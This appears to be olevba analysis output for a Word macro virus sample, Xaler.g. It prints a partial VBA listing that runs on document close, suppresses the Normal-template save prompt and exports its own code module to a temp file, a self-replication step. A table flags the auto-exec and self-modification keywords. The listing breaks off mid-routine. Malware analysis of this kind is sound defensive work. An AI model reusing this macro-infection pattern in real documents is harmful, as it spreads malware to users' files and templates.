olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Xaler.g-9fc50f57dd3908ccebd4efbe71eee32b34f3c013
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.vba 
in file: Virus.MSWord.Xaler.g-9fc50f57dd3908ccebd4efbe71eee32b34f3c013 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'RELAX
Private Sub RELAX2()
End
End Sub

Private Sub ComboBox1_Change()

End Sub

Private Sub Document_Close()
Call GOODSub
Call RELAX2
End Sub

Private Sub GOODSub()
On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = "C:\temp.tmp"
MacroContainer.VBProject.vbcomponents.Item("ThisDocument").Export x$
Open x$ For Input As #1
keimeno
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |ComboBox1_Change    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
